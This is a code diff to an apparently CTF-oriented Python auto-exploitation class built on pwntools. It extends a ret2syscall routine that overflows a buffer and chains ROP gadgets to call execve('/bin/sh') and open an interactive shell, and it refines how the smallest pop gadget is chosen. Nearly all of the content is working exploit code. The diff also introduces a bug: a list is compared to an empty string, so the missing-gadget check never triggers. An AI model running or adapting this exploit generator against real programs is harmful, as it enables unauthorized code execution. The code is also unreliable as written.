@@ -46,14 +46,29 @@ class App:
         
         #one = self.find_one_gadget(binary)
         self.ret2execve(binary)
+        #self.generate_rop_chain({"rax": 0x3b, "rdi": 0xcafebabe, "rsi": 0, "rdx": 0})
 
-    def ret2syscall(self, binary):
+
+    def ret2syscall(self, binary, excempt=0):
         io = process(binary)
 
         syscall = None
         binsh = next(self.pwnelf.search(b"/bin/sh"))
         payload = self.find_overflow(binary)
-        payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
+
+        # in case ret2syscall fails, call it with a different excempt value
+        # each value will try to infer that some register that should be null is already null
+        if excempt == 0:
+            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
+        elif excempt == 1:
+            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rsi": 0})
+        elif excempt == 2:
+            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rdx": 0})
+        elif excempt == 3:
+            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh})
+        else:
+            print("[!] ret2syscall fail.")
+            return None
 
         for file, gadget in self.rs.search(search="syscall"):
             if "syscall;" in str(gadget):
@@ -65,7 +80,6 @@ class App:
         io.sendlineafter(b">>>", payload)
 
         io.interactive()
-
 
     def ret2system(self, binary, add_ret=True):
         io = process(binary)
@@ -415,7 +429,7 @@ class App:
             # check if the value has not already been met
             if reg not in completed:
                 # use a gadget that has only pop in it because if not then it can get risky  
-                use = ""
+                use = []
 
                 for file, gadget in self.rs.search(search=f"pop {reg}"):
                     tmp = [ i for i in str(gadget).split(";") ]
@@ -426,18 +440,23 @@ class App:
                             cool = False
 
                     if cool:
-                        use = str(gadget)
-                        break
+                        use.append(str(gadget))
 
                 if use == "":
                     print("[!] Could not find gadget. Trying Angr ROP.")
                     return None
+                
+                # find smallest gadget        
+                gadget_used = use[0]
+                
+                for gadget in use:
+                    if gadget.count(";") < gadget_used.count(";"):
+                        gadget_used = gadget
 
                 # we have found our gadget, now time to add it to our payload
-                payload += p64(int(use.split(":")[0], 16))
-                print(use)
+                payload += p64(int(gadget_used.split(":")[0], 16))
                 
-                alice = use.split(":")
+                alice = gadget_used.split(":")
                 instructions = alice[1].split(";")
 
                 for ins in instructions:
@@ -447,13 +466,10 @@ class App:
 
                     if ins[-3:] in dict_registers.keys():
                         payload += p64(dict_registers[ins[-3:]])
-                        print(hex(dict_registers[ins[-3:]]))
                         completed.append(ins[-3:])
 
                     else:
-                        print("0xdeadbeef")
                         payload += p64(0xdeadbeef)
-
         return payload
 
 
